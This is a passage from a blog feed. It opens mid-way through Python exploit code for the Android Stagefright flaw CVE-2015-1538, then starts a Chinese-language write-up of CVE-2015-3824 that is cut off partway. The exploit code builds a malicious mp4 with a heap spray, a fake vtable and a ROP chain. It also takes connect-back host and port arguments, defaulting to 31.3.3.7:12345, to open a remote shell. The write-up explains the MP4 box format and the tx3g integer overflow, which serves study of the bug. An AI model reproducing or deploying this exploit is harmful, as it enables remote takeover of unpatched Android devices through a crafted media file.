payload...</span></span><br><span class="line">    rop += buf</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rop</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Build an mp4 that exploits CVE-2015-1538 #1</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># We mimic meow.3gp here...</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_mp4</span><span class="params">(sp_addr, newpc_val, cb_host, cb_port)</span>:</span></span><br><span class="line">    chunks = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build the MP4 header...</span></span><br><span class="line">    ftyp =  <span class="string">'mp42'</span></span><br><span class="line">    ftyp += struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>)</span><br><span class="line">    ftyp += <span class="string">'mp42'</span></span><br><span class="line">    ftyp += <span class="string">'isom'</span></span><br><span class="line">    chunks.append(make_chunk(<span class="string">'ftyp'</span>, ftyp))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Note, this causes a few allocations...</span></span><br><span class="line">    moov_data = <span class="string">''</span></span><br><span class="line">    moov_data += make_chunk(<span class="string">'mvhd'</span>,</span><br><span class="line">        struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0x41414141</span>) +</span><br><span class="line">        (<span class="string">'B'</span> * <span class="number">0x5c</span>) )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add a minimal, verified trak to satisfy mLastTrack being set</span></span><br><span class="line">    moov_data += make_chunk(<span class="string">'trak'</span>,</span><br><span class="line">        make_chunk(<span class="string">'stbl'</span>,</span><br><span class="line">            make_stsc(<span class="number">0x28</span>, <span class="number">0x28</span>) +</span><br><span class="line">            make_stco() +</span><br><span class="line">            make_stsz() +</span><br><span class="line">            make_stts() ))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Spray the heap using a large tx3g chunk (can contain binary data!)</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">       0x4007004e &lt;_ZNK7android7RefBase9decStrongEPKv+2&gt;:   ldr r4, [r0, #4]  ; load mRefs</span></span><br><span class="line"><span class="string">       0x40070050 &lt;_ZNK7android7RefBase9decStrongEPKv+4&gt;:   mov r5, r0</span></span><br><span class="line"><span class="string">       0x40070052 &lt;_ZNK7android7RefBase9decStrongEPKv+6&gt;:   mov r6, r1</span></span><br><span class="line"><span class="string">       0x40070054 &lt;_ZNK7android7RefBase9decStrongEPKv+8&gt;:   mov r0, r4</span></span><br><span class="line"><span class="string">       0x40070056 &lt;_ZNK7android7RefBase9decStrongEPKv+10&gt;:  blx 0x40069884    ; atomic_decrement</span></span><br><span class="line"><span class="string">       0x4007005a &lt;_ZNK7android7RefBase9decStrongEPKv+14&gt;:  cmp r0, #1        ; must be 1</span></span><br><span class="line"><span class="string">       0x4007005c &lt;_ZNK7android7RefBase9decStrongEPKv+16&gt;:  bne.n   0x40070076 &lt;_ZNK7android7RefBase9decStrongEPKv+42&gt;</span></span><br><span class="line"><span class="string">       0x4007005e &lt;_ZNK7android7RefBase9decStrongEPKv+18&gt;:  ldr r0, [r4, #8]  ; load refs-&gt;mBase</span></span><br><span class="line"><span class="string">       0x40070060 &lt;_ZNK7android7RefBase9decStrongEPKv+20&gt;:  ldr r1, [r0, #0]  ; load mBase._vptr</span></span><br><span class="line"><span class="string">       0x40070062 &lt;_ZNK7android7RefBase9decStrongEPKv+22&gt;:  ldr r2, [r1, #12] ; load method address</span></span><br><span class="line"><span class="string">       0x40070064 &lt;_ZNK7android7RefBase9decStrongEPKv+24&gt;:  mov r1, r6</span></span><br><span class="line"><span class="string">       0x40070066 &lt;_ZNK7android7RefBase9decStrongEPKv+26&gt;:  blx r2            ; call it!</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    page = <span class="string">''</span></span><br><span class="line">    off = <span class="number">0</span>  <span class="comment"># the offset to the next object</span></span><br><span class="line">    off += <span class="number">8</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, sp_addr + <span class="number">8</span> + <span class="number">16</span> + <span class="number">8</span> + <span class="number">12</span> - <span class="number">28</span>)    <span class="comment"># _vptr.RefBase (for when we smash mDataSource)</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, sp_addr + off) <span class="comment"># mRefs</span></span><br><span class="line">    off += <span class="number">16</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">1</span>)             <span class="comment"># mStrong</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xc0dedbad</span>)    <span class="comment"># mWeak</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, sp_addr + off) <span class="comment"># mBase</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">16</span>)            <span class="comment"># mFlags (dont set OBJECT_LIFETIME_MASK)</span></span><br><span class="line">    off += <span class="number">8</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, sp_addr + off) <span class="comment"># the mBase _vptr.RefBase</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xf00dbabe</span>)    <span class="comment"># mBase.mRefs (unused)</span></span><br><span class="line">    off += <span class="number">16</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xc0de0000</span> + <span class="number">0x00</span>)  <span class="comment"># vtable entry 0</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xc0de0000</span> + <span class="number">0x04</span>)  <span class="comment"># vtable entry 4</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xc0de0000</span> + <span class="number">0x08</span>)  <span class="comment"># vtable entry 8</span></span><br><span class="line">    page += struct.pack(<span class="string">'&lt;L'</span>, newpc_val)          <span class="comment"># vtable entry 12</span></span><br><span class="line">    rop = build_rop(off, sp_addr, newpc_val, cb_host, cb_port)</span><br><span class="line">    x = len(page)</span><br><span class="line">    <span class="keyword">while</span> len(page) &lt; <span class="number">4096</span>:</span><br><span class="line">        page += struct.pack(<span class="string">'&lt;L'</span>, <span class="number">0xf0f00000</span>+x)</span><br><span class="line">        x += <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    off = <span class="number">0x34</span></span><br><span class="line">    page = page[:off] + rop + page[off+len(rop):]</span><br><span class="line">    spray = page * (((<span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>) / len(page)) - <span class="number">20</span>)</span><br><span class="line">    moov_data += make_chunk(<span class="string">'tx3g'</span>, spray)</span><br><span class="line">    block = <span class="string">'A'</span> * <span class="number">0x1c</span></span><br><span class="line">    bigger = <span class="string">'B'</span> * <span class="number">0x40</span></span><br><span class="line">    udta = make_chunk(<span class="string">'udta'</span>,</span><br><span class="line">        make_chunk(<span class="string">'meta'</span>,</span><br><span class="line">            struct.pack(<span class="string">'&gt;L'</span>, <span class="number">0</span>) +</span><br><span class="line">            make_chunk(<span class="string">'ilst'</span>,</span><br><span class="line">                make_chunk(<span class="string">'cpil'</span>,    make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">21</span>, <span class="number">0</span>) + <span class="string">'A'</span>)) +</span><br><span class="line">                make_chunk(<span class="string">'trkn'</span>,    make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + <span class="string">'AAAABBBB'</span>)) +</span><br><span class="line">                make_chunk(<span class="string">'disk'</span>,    make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + <span class="string">'AAAABB'</span>)) +</span><br><span class="line">                make_chunk(<span class="string">'covr'</span>,    make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + block)) * <span class="number">32</span> +</span><br><span class="line">                make_chunk(<span class="string">'\xa9alb'</span>, make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + block)) +</span><br><span class="line">                make_chunk(<span class="string">'\xa9ART'</span>, make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + block)) +</span><br><span class="line">                make_chunk(<span class="string">'aART'</span>,    make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + block)) +</span><br><span class="line">                make_chunk(<span class="string">'\xa9day'</span>, make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + block)) +</span><br><span class="line">                make_chunk(<span class="string">'\xa9nam'</span>, make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + block)) +</span><br><span class="line">                make_chunk(<span class="string">'\xa9wrt'</span>, make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + block)) +</span><br><span class="line">                make_chunk(<span class="string">'gnre'</span>,    make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">1</span>, <span class="number">0</span>) + block)) +</span><br><span class="line">                make_chunk(<span class="string">'covr'</span>,    make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + block)) * <span class="number">32</span> +</span><br><span class="line">                make_chunk(<span class="string">'\xa9ART'</span>, make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + bigger)) +</span><br><span class="line">                make_chunk(<span class="string">'\xa9wrt'</span>, make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + bigger)) +</span><br><span class="line">                make_chunk(<span class="string">'\xa9day'</span>, make_chunk(<span class="string">'data'</span>, struct.pack(<span class="string">'&gt;LL'</span>, <span class="number">0</span>, <span class="number">0</span>) + bigger)))</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    moov_data += udta</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Make the nasty trak</span></span><br><span class="line">    tkhd1 = <span class="string">''</span>.join([</span><br><span class="line">        <span class="string">'\x00'</span>,       <span class="comment"># version</span></span><br><span class="line">        <span class="string">'D'</span> * <span class="number">3</span>,      <span class="comment"># padding</span></span><br><span class="line">        <span class="string">'E'</span> * (<span class="number">5</span>*<span class="number">4</span>),  <span class="comment"># &#123;c,m&#125;time, id, ??, duration</span></span><br><span class="line">        <span class="string">'F'</span> * <span class="number">0x10</span>,   <span class="comment"># ??</span></span><br><span class="line">        struct.pack(<span class="string">'&gt;LLLLLL'</span>,</span><br><span class="line">            <span class="number">0x10000</span>,  <span class="comment"># a00</span></span><br><span class="line">            <span class="number">0</span>,        <span class="comment"># a01</span></span><br><span class="line">            <span class="number">0</span>,        <span class="comment"># dx</span></span><br><span class="line">            <span class="number">0</span>,        <span class="comment"># a10</span></span><br><span class="line">            <span class="number">0x10000</span>,  <span class="comment"># a11</span></span><br><span class="line">            <span class="number">0</span>),       <span class="comment"># dy</span></span><br><span class="line">        <span class="string">'G'</span> * <span class="number">0x14</span></span><br><span class="line">        ])</span><br><span class="line"></span><br><span class="line">    trak1 = <span class="string">''</span></span><br><span class="line">    trak1 += make_chunk(<span class="string">'tkhd'</span>, tkhd1)</span><br><span class="line"></span><br><span class="line">    mdhd1 = <span class="string">''</span>.join([</span><br><span class="line">        <span class="string">'\x00'</span>,       <span class="comment"># version</span></span><br><span class="line">        <span class="string">'D'</span> * <span class="number">0x17</span>,   <span class="comment"># padding</span></span><br><span class="line">        ])</span><br><span class="line"></span><br><span class="line">    mdia1 = <span class="string">''</span></span><br><span class="line">    mdia1 += make_chunk(<span class="string">'mdhd'</span>, mdhd1)</span><br><span class="line">    mdia1 += make_chunk(<span class="string">'hdlr'</span>, <span class="string">'F'</span> * <span class="number">0x3a</span>)</span><br><span class="line"></span><br><span class="line">    dinf1 = <span class="string">''</span></span><br><span class="line">    dinf1 += make_chunk(<span class="string">'dref'</span>, <span class="string">'H'</span> * <span class="number">0x14</span>)</span><br><span class="line"></span><br><span class="line">    minf1 = <span class="string">''</span></span><br><span class="line">    minf1 += make_chunk(<span class="string">'smhd'</span>, <span class="string">'G'</span> * <span class="number">0x08</span>)</span><br><span class="line">    minf1 += make_chunk(<span class="string">'dinf'</span>, dinf1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build the nasty sample table to trigger the vulnerability here.</span></span><br><span class="line">    stbl1 = make_stsc(<span class="number">3</span>, (<span class="number">0x1200</span> / <span class="number">0xc</span>) - <span class="number">1</span>, sp_addr, <span class="literal">True</span>) <span class="comment"># TRIGGER</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add the stbl to the minf chunk</span></span><br><span class="line">    minf1 += make_chunk(<span class="string">'stbl'</span>, stbl1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add the minf to the mdia chunk</span></span><br><span class="line">    mdia1 += make_chunk(<span class="string">'minf'</span>, minf1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add the mdia to the track</span></span><br><span class="line">    trak1 += make_chunk(<span class="string">'mdia'</span>, mdia1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add the nasty track to the moov data</span></span><br><span class="line">    moov_data += make_chunk(<span class="string">'trak'</span>, trak1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Finalize the moov chunk</span></span><br><span class="line">    moov = make_chunk(<span class="string">'moov'</span>, moov_data)</span><br><span class="line">    chunks.append(moov)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Combine outer chunks together and voila.</span></span><br><span class="line">    data = <span class="string">''</span>.join(chunks)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    <span class="keyword">import</span> mp4</span><br><span class="line">    <span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_file</span><span class="params">(path, content)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(path, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addr</span><span class="params">(sval)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> sval.startswith(<span class="string">'0x'</span>):</span><br><span class="line">            <span class="keyword">return</span> int(sval, <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">return</span> int(sval)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># The address of a fake StrongPointer object (sprayed)</span></span><br><span class="line">    sp_addr   = <span class="number">0x41d00010</span>  <span class="comment"># takju @ imm76i - 2MB (via hangouts)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># The address to of our ROP pivot</span></span><br><span class="line">    newpc_val = <span class="number">0xb0002850</span> <span class="comment"># point sp at __dl_restore_core_regs</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Allow the user to override parameters</span></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--connectback-host'</span>, dest=<span class="string">'cbhost'</span>, default=<span class="string">'31.3.3.7'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--connectback-port'</span>, dest=<span class="string">'cbport'</span>, type=int, default=<span class="number">12345</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-s'</span>, <span class="string">'--spray-address'</span>, dest=<span class="string">'spray_addr'</span>, type=addr, default=<span class="literal">None</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-r'</span>, <span class="string">'--rop-pivot'</span>, dest=<span class="string">'rop_pivot'</span>, type=addr, default=<span class="literal">None</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-o'</span>, <span class="string">'--output-file'</span>, dest=<span class="string">'output_file'</span>, default=<span class="string">'cve-2015-1538-1.mp4'</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        sys.exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.spray_addr == <span class="literal">None</span>:</span><br><span class="line">        args.spray_addr = sp_addr</span><br><span class="line">    <span class="keyword">if</span> args.rop_pivot == <span class="literal">None</span>:</span><br><span class="line">        args.rop_pivot = newpc_val</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build the MP4 file...</span></span><br><span class="line">    data = mp4.create_mp4(args.spray_addr, args.rop_pivot, args.cbhost, args.cbport)</span><br><span class="line">    print(<span class="string">'[*] Saving crafted MP4 to %s ...'</span> % args.output_file)</span><br><span class="line">    write_file(args.output_file, data)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://github.com/jduck/cve-2015-1538-1&quot;&gt;https://github.com/jduck/cve-2015-1538-1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://wooyun.js.org/dro
      
    
    </summary>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/categories/Android/"/>
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/Android/CVE/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>StageFright 系列漏洞（零）CVE-2015-3824</title>
    <link href="https://github.com/Cracke-S-J/2020/05/24/StageFright%20%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%EF%BC%88%E9%9B%B6%EF%BC%89CVE-2015-3824/"/>
    <id>https://github.com/Cracke-S-J/2020/05/24/StageFright%20%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%EF%BC%88%E9%9B%B6%EF%BC%89CVE-2015-3824/</id>
    <published>2020-05-24T05:10:55.000Z</published>
    <updated>2020-05-31T06:15:39.975Z</updated>
    
    <content type="html"><![CDATA[<p>前一阵看了一阵二进制漏洞的利用，其实挺迷惑方向的，CTF pwn是一种玩法，然后其它还有浏览器、虚拟机逃逸、Office全家桶、Adobe全家桶、kernel等等，还有什么物联网，选恐的我当时就慌了，每个方向（除物联网，我不会）看了几个洞以后，学到了一些二进制利用的套路，也没有什么特别的感受。今天看到了这个StageFright系列漏洞，还挺有感觉，打算分析一遍。</p><p>还有看逼乎上说什么二进制漏洞“一将功成万骨枯”，我也是无语。</p><p><a href="https://www.madebug.net/static/drops/papers-7558.html" target="_blank" rel="noopener">Stagefright漏洞公告</a></p><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>StageFright是一个Android中的系统服务，会被mediaserver调用，可处理各种多媒体格式，由Natvie C++代码实现，动态库名字叫<code>libstagefright.so</code>，代码在<code>/frameworks/av/media/libstagefright/</code>。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="mp4文件格式解析"><a href="#mp4文件格式解析" class="headerlink" title="mp4文件格式解析"></a>mp4文件格式解析</h3><p>可以看下<a href="https://www.jianshu.com/p/529c3729f357" target="_blank" rel="noopener">这里</a>。</p><p>我们重点关注的是size的解析部分。</p><ul><li>mp4主要由一些box组成，显然box应该有一个头，头里放着size。</li><li>size是包含box header的整个box的大小。</li><li>size为4bytes，largesize为8bytes。</li><li>如果header中的size为1，则表示box长度需要更多的bits位来描述，在后面会有一个64bits位的largesize用来描述box的长度。如果size为0，表示该box为文件的最后一个box，文件结尾。</li></ul><p>看下size的处理，在<a href="https://android.googlesource.com/platform/frameworks/av/+/3aef35600523eb6b4ccc8086a8913e80701a031a/media/libstagefright/MPEG4Extractor.cpp" target="_blank" rel="noopener">MPEG4Extractor.cpp</a>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">status_t</span> MPEG4Extractor::parseChunk(<span class="keyword">off64_t</span> *offset, <span class="keyword">int</span> depth) &#123;</span><br><span class="line">    ALOGV(<span class="string">"entering parseChunk %lld/%d"</span>, *offset, depth);</span><br><span class="line">    <span class="keyword">uint32_t</span> hdr[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> (mDataSource-&gt;readAt(*offset, hdr, <span class="number">8</span>) &lt; <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint64_t</span> chunk_size = ntohl(hdr[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">uint32_t</span> chunk_type = ntohl(hdr[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">off64_t</span> data_offset = *offset + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (chunk_size == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mDataSource-&gt;readAt(*offset + <span class="number">8</span>, &amp;chunk_size, <span class="number">8</span>) &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">        &#125;</span><br><span class="line">        chunk_size = ntoh64(chunk_size);</span><br><span class="line">        data_offset += <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">if</span> (chunk_size &lt; <span class="number">16</span>) &#123;</span><br><span class="line">            <span class="comment">// The smallest valid chunk is 16 bytes long in this case.</span></span><br><span class="line">            <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (chunk_size &lt; <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="comment">// The smallest valid chunk is 8 bytes long.</span></span><br><span class="line">        <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h3 id="JeMalloc"><a href="#JeMalloc" class="headerlink" title="JeMalloc"></a>JeMalloc</h3><p>从Android 5.0开始，堆分配器使用的是<a href="https://zhuanlan.zhihu.com/p/48957114" target="_blank" rel="noopener">JeMalloc</a>，它跟ptmalloc相比就是，小内存使用regions分配，region之间是没有元数据的，所以我们不能使用ctf pwn中常用的什么改fd实现任意分配的手段了。</p><p>不过没关系，这时候我们通常采取的手段是类似Windows上的一些操作，把一个<strong>好用</strong>的对象放到可溢出的地方，然后修改它的虚表。</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>还在这个函数中，在处理tx3g这个box的时候，size为之前所解析的所有tx3g box的长度总和。chunk_size 为当前要处理的tx3g box的长度。然后size + chunk_size计算要分配的内存大小。chunk_size是uint64_t类型的，chunk_size我们在文件格式中我们所能控制的最大大小为0xFFFFFFFFFFFFFFFF，也是64位，但是我们还有一个size为可以控制，这样一相加，就会造成整数溢出，导致分配小内存。而我们的数据大小则远远大于分配的内存大小，进而在memcpy的时候造成堆溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">case FOURCC('t', 'x', '3', 'g'):</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> type;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">void</span> *data;</span><br><span class="line">    <span class="keyword">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!mLastTrack-&gt;meta-&gt;findData(</span><br><span class="line">            kKeyTextFormatData, &amp;type, &amp;data, &amp;size)) &#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint8_t</span> *buffer = <span class="keyword">new</span> <span class="keyword">uint8_t</span>[size + chunk_size];   <span class="comment">// &lt; -- overflow</span></span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(buffer, data, size);                     <span class="comment">// &lt; -- ohhhhhhhhhhh</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">size_t</span>)(mDataSource-&gt;readAt(*offset, buffer + size, chunk_size))</span><br><span class="line">            &lt; chunk_size) &#123;</span><br><span class="line">        <span class="keyword">delete</span>[] buffer;</span><br><span class="line">        buffer = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">    &#125;</span><br><span class="line">    mLastTrack-&gt;meta-&gt;setData(</span><br><span class="line">            kKeyTextFormatData, <span class="number">0</span>, buffer, size + chunk_size);</span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    *offset += chunk_size;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>下面先来看几个<strong>好用</strong>的对象。</p><h3 id="tx3g-box"><a href="#tx3g-box" class="headerlink" title="tx3g box"></a>tx3g box</h3><p>先看一个结构体<code>MPEG4DataSource</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MPEG4DataSource</span> :</span> <span class="keyword">public</span> DataSource &#123;</span><br><span class="line">    MPEG4DataSource(<span class="keyword">const</span> sp&lt;DataSource&gt; &amp;source);</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> status_t <span class="title">initCheck</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> ssize_t <span class="title">readAt</span><span class="params">(<span class="keyword">off64_t</span> offset, <span class="keyword">void</span> *data, <span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> status_t <span class="title">getSize</span><span class="params">(<span class="keyword">off64_t</span> *size)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> uint32_t <span class="title">flags</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">status_t</span> setCachedRange(<span class="keyword">off64_t</span> offset, <span class="keyword">size_t</span> size);</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">virtual</span> ~MPEG4DataSource();</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Mutex mLock;</span><br><span class="line">    sp&lt;DataSource&gt; mSource;</span><br><span class="line">    <span class="keyword">off64_t</span> mCachedOffset;</span><br><span class="line">    <span class="keyword">size_t</span> mCachedSize;</span><br><span class="line">    <span class="keyword">uint8_t</span> *mCache;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">clearCache</span><span class="params">()</span></span>;</span><br><span class="line">    MPEG4DataSource(<span class="keyword">const</span> MPEG4DataSource &amp;);</span><br><span class="line">    MPEG4DataSource &amp;<span class="keyword">operator</span>=(<span class="keyword">const</span> MPEG4DataSource &amp;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到它继承自<code>DataSource</code>，有很多虚函数，下面再看下它是怎么被解析tx3g box利用的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!mLastTrack-&gt;meta-&gt;findData(</span><br><span class="line">        